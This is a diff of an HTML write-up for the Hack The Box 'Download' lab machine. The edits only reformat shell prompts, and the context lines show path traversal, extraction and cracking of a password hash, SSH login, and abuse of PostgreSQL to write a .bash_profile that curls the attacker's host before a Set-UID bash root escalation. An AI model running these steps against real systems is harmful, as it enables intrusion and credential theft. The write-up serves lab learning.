 We can confirm this by examining what happens during the registration of a new user:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">routers</span><span class="si">%2f</span><span class="s1">auth.js'</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'client.user.create'</span> <span class="o">-</span><span class="n">A</span> <span class="mi">5</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">routers</span><span class="si">%2f</span><span class="s1">auth.js'</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'client.user.create'</span> <span class="o">-</span><span class="n">A</span> <span class="mi">5</span>
     <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">user</span><span class="o">.</span><span class="n">create</span><span class="p">({</span>
         <span class="n">data</span><span class="p">:</span> <span class="p">{</span>
             <span class="n">username</span><span class="p">:</span> <span class="n">data</span><span class="o">.</span><span class="n">username</span><span class="p">,</span>
@@ -506,7 +506,7 @@ We can confirm this by examining what happens during the registration of a new u
 </pre></div>
 
 When storing the password in the database, it invokes the <code>hashPassword</code> function, which converts the string parameters to MD5:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">routers</span><span class="si">%2f</span><span class="s1">auth.js'</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'const hashPassword'</span> <span class="o">-</span><span class="n">A</span> <span class="mi">2</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">routers</span><span class="si">%2f</span><span class="s1">auth.js'</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'const hashPassword'</span> <span class="o">-</span><span class="n">A</span> <span class="mi">2</span>
 <span class="n">const</span> <span class="n">hashPassword</span> <span class="o">=</span> <span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
     <span class="k">return</span> <span class="n">node_crypto_1</span><span class="o">.</span><span class="n">default</span><span class="o">.</span><span class="n">createHash</span><span class="p">(</span><span class="s2">"md5"</span><span class="p">)</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">(</span><span class="s2">"hex"</span><span class="p">);</span>
 <span class="p">};</span>
@@ -591,18 +591,18 @@ Here is the automation script:<br/><br/>
 </pre></div>
 
 Remember to replace your <code>cookie-monster</code> binary path and the username in the cookie. Let's run the script (this may take a while):<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
 <span class="p">[</span><span class="o">&lt;</span><span class="p">]</span> <span class="n">PASSWORD</span><span class="p">:</span> <span class="mi">11</span><span class="n">d9322277be7d00e624bc2c59276f4c</span>
 </pre></div>
 
 It works great! We are successfully extracting passwords from the database. Now, let's change our username in the Python script to <code>WESLEY</code> and execute the script.<br/><br/>
 After a while, we obtained the password in MD5 format:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
 <span class="p">[</span><span class="err">└</span><span class="p">]</span> <span class="n">PASSWORD</span><span class="p">:</span> <span class="n">f88976c10af66915918945b9679b2bd3</span>
 </pre></div>
 
 Let's try to crack it using <a href="https://github.com/openwall/john">John the Ripper</a>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="nb">hash</span> <span class="o">--</span><span class="nb">format</span><span class="o">=</span><span class="n">Raw</span><span class="o">-</span><span class="n">MD5</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="nb">hash</span> <span class="o">--</span><span class="nb">format</span><span class="o">=</span><span class="n">Raw</span><span class="o">-</span><span class="n">MD5</span>
 <span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
 <span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">Raw</span><span class="o">-</span><span class="n">MD5</span> <span class="p">[</span><span class="n">MD5</span> <span class="mi">128</span><span class="o">/</span><span class="mi">128</span> <span class="n">AVX</span> <span class="mi">4</span><span class="n">x3</span><span class="p">])</span>
 <span class="ne">Warning</span><span class="p">:</span> <span class="n">no</span> <span class="n">OpenMP</span> <span class="n">support</span> <span class="k">for</span> <span class="n">this</span> <span class="nb">hash</span> <span class="nb">type</span><span class="p">,</span> <span class="n">consider</span> <span class="o">--</span><span class="n">fork</span><span class="o">=</span><span class="mi">4</span>
@@ -616,7 +616,7 @@ Let's try to crack it using <a href="https://github.com/openwall/john">John the 
 </pre></div>
 
 The password is <code>dunkindonuts</code>. Let's try using it to authenticate through SSH as the user <code>WESLEY</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">wesley</span><span class="o">@</span><span class="mf">10.10.11.226</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">wesley</span><span class="o">@</span><span class="mf">10.10.11.226</span>
 <span class="n">wesley</span><span class="o">@</span><span class="mf">10.10.11.226</span><span class="s1">'s password: </span>
 <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">20.04.6</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.4.0</span><span class="o">-</span><span class="mi">155</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
 
@@ -650,40 +650,40 @@ The password is <code>dunkindonuts</code>. Let's try using it to authenticate th
 
 
 <span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Thu</span> <span class="n">Aug</span>  <span class="mi">3</span> <span class="mi">08</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">52</span> <span class="mi">2023</span> <span class="kn">from</span> <span class="mf">10.10.14.23</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 We have successfully accessed the system as the user <code>wesley</code>.<br/><br/>
 As <code>wesley</code>, we can read the first flag:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span> 
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span> 
 <span class="mi">23195</span><span class="o">**********************</span><span class="mi">85</span><span class="n">bcf</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Looking at the groups to which the user 'WESLEY' belongs, I observed that it doesn't belong to any particularly interesting group:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">wesley</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">wesley</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">wesley</span><span class="p">)</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Upon listing its sudo privileges, I noticed that it doesn't have any sudo privileges:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
 <span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">wesley</span><span class="p">:</span> 
 <span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">wesley</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">download</span><span class="o">.</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Nor are there any interesting capabilities that we could abuse:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">getcap</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> 
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">getcap</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> 
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">gstreamer1</span><span class="mf">.0</span><span class="o">/</span><span class="n">gstreamer</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">gst</span><span class="o">-</span><span class="n">ptp</span><span class="o">-</span><span class="n">helper</span> <span class="o">=</span> <span class="n">cap_net_bind_service</span><span class="p">,</span><span class="n">cap_net_admin</span><span class="o">+</span><span class="n">ep</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ping</span> <span class="o">=</span> <span class="n">cap_net_raw</span><span class="o">+</span><span class="n">ep</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mtr</span><span class="o">-</span><span class="n">packet</span> <span class="o">=</span> <span class="n">cap_net_raw</span><span class="o">+</span><span class="n">ep</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">traceroute6</span><span class="o">.</span><span class="n">iputils</span> <span class="o">=</span> <span class="n">cap_net_raw</span><span class="o">+</span><span class="n">ep</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Let's take a look at the <code>Set-UID</code> files. For this, I will use the <code>find</code> command:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">policykit</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
@@ -700,7 +700,7 @@ Let's take a look at the <code>Set-UID</code> files. For this, I will use the <c
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 There are no interesting files that we could abuse, so at this point, we can't do anything to escalate privileges.<br/><br/>
@@ -708,8 +708,8 @@ Next, I will upload <a href="https://github.com/DominicBreuker/pspy">pspy</a> to
 <a href="https://github.com/DominicBreuker/pspy">pspy</a> is a command-line tool used to monitor processes and commands on Linux systems. It provides real-time visualization of system activities, including command execution and changes in processes, which can be useful for detecting suspicious activities or analyzing system behavior.<br/><br/>
 This tool could be helpful in detecting suspicious activities carried out by other users.<br/><br/>
 I downloaded the <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64">pspy64</a> release version and uploaded it to the victim machine:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">./</span><span class="n">pspy</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">./</span><span class="n">pspy</span>
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">./</span><span class="n">pspy</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">./</span><span class="n">pspy</span>
 </pre></div>
 
 Analyzing the pspy output, I observed some SSH connections to the root user:<br/><br/>
@@ -727,7 +727,7 @@ In other words, the <code>-l</code> parameter in the <code>su</code> command is 
 In the context of the <code>Postgres</code> user, if we have the ability to modify the <code>.bashrc</code> or <code>.bash_profile</code> files associated with the <code>Postgres</code> user, we gain the potential to influence the environment settings for that user. By strategically altering these files, we may be able to execute commands with the permissions and configurations of the <code>Postgres</code> user, effectively manipulating its behavior and privileges on the system.<br/><br/>
 At this point, we are not able to modify or create these files. However, in the event that we gain access to a PostgreSQL database, attempting to modify these files could serve as a trick to escalate privileges.<br/><br/>
 Recalling the other commands that the <code>root</code> user was executing, one of them was <code>systemctl status download-site</code>. Since this is an unusual service, it is interesting to list its content. Therefore, let's first locate it in the filesystem:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="s2">"download-site.service"</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="s2">"download-site.service"</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
 <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
 <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">multi</span><span class="o">-</span><span class="n">user</span><span class="o">.</span><span class="n">target</span><span class="o">.</span><span class="n">wants</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
 <span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">cgroup</span><span class="o">/</span><span class="n">devices</span><span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
@@ -735,11 +735,11 @@ Recalling the other commands that the <code>root</code> user was executing, one 
 <span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">cgroup</span><span class="o">/</span><span class="n">pids</span><span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
 <span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">cgroup</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
 <span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">cgroup</span><span class="o">/</span><span class="n">unified</span><span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
 </pre></div>
 
 Upon inspecting its content, we found some <code>PostgreSQL</code> credentials:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
 <span class="p">[</span><span class="n">Unit</span><span class="p">]</span>
 <span class="n">Description</span><span class="o">=</span><span class="n">Download</span><span class="o">.</span><span class="n">HTB</span> <span class="n">Web</span> <span class="n">Application</span>
 <span class="n">After</span><span class="o">=</span><span class="n">network</span><span class="o">.</span><span class="n">target</span>
@@ -755,7 +755,7 @@ Upon inspecting its content, we found some <code>PostgreSQL</code> credentials:<
 
 <span class="p">[</span><span class="n">Install</span><span class="p">]</span>
 <span class="n">WantedBy</span><span class="o">=</span><span class="n">multi</span><span class="o">-</span><span class="n">user</span><span class="o">.</span><span class="n">target</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
 </pre></div>
 
 Let's try to log in to the <code>download</code> database:<br/><br/>
@@ -772,7 +772,7 @@ First, let's attempt to write the <code>.bash_profile</code> file in the Postgre
 There are some queries we can use. I will use the <code>COPY (SELECT '(file content)') to '(file directory path)'</code> approach.<br/><br/>
 First, we will attempt to make the Postgres user send us an HTTP request using the curl command to a server that we will be hosting on our attacker machine.<br/><br/>
 Let's set up our HTTP Server on port 80:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
 <span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
 </pre></div>
 
@@ -783,22 +783,22 @@ Now, let's write the <code>.bash_profile</code> file in the Postgres home direct
 </pre></div>
 
 Now, if we list the contents of the <code>/var/lib/postgresql</code> directory, the <code>.bash_profile</code> file with the new content will be present:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span>
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span>
 <span class="n">total</span> <span class="mi">20</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">3</span> <span class="n">postgres</span> <span class="n">postgres</span> <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">21</span> <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="o">.</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">41</span> <span class="n">root</span>     <span class="n">root</span>     <span class="mi">4096</span> <span class="n">Jul</span> <span class="mi">19</span> <span class="mi">16</span><span class="p">:</span><span class="mi">06</span> <span class="o">..</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">3</span> <span class="n">postgres</span> <span class="n">postgres</span> <span class="mi">4096</span> <span class="n">Apr</span> <span class="mi">21</span>  <span class="mi">2023</span> <span class="mi">12</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">postgres</span> <span class="n">postgres</span>    <span class="mi">5</span> <span class="n">Nov</span> <span class="mi">21</span> <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="o">.</span><span class="n">bash_history</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">postgres</span> <span class="n">postgres</span>   <span class="mi">16</span> <span class="n">Nov</span> <span class="mi">21</span> <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="o">.</span><span class="n">bash_profile</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
 </pre></div>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/.</span><span class="n">bash_profile</span>
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/.</span><span class="n">bash_profile</span>
 <span class="n">curl</span> <span class="mf">10.10.16.7</span>
-<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
+<span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
 </pre></div>
 
 After a while, we receive the HTTP request on our HTTP Server:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
 <span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
 <span class="mf">10.10.11.226</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">21</span><span class="o">/</span><span class="n">Nov</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">09</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="s2">"GET / HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
 </pre></div>
@@ -848,7 +848,7 @@ I modified it to make it work on the victim machine:<br/><br/>
 
 If all works well, after executing this exploit, the <code>/bin/bash</code> will become <code>Set-UID</code>, and we will be able to use the <code>-p</code> parameter to run commands as root.<br/><br/>
 Let's copy the exploit to the <code>/dev/shm</code> directory:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cp</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span>
+<div class="highlight"><pre><span></span><span class="nd">wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cp</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span>
 </pre></div>
 
 Now, let's modify the <code>.bash_profile</code> of the <code>Postgres</code> user:<br/><br/>
@@ -858,13 +858,13 @@ Now, let's modify the <code>.bash_profile</code> of the <code>Postgres</code> us
 </pre></div>
 
 After a short wait, let's list the privileges of <code>/bin/bash</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
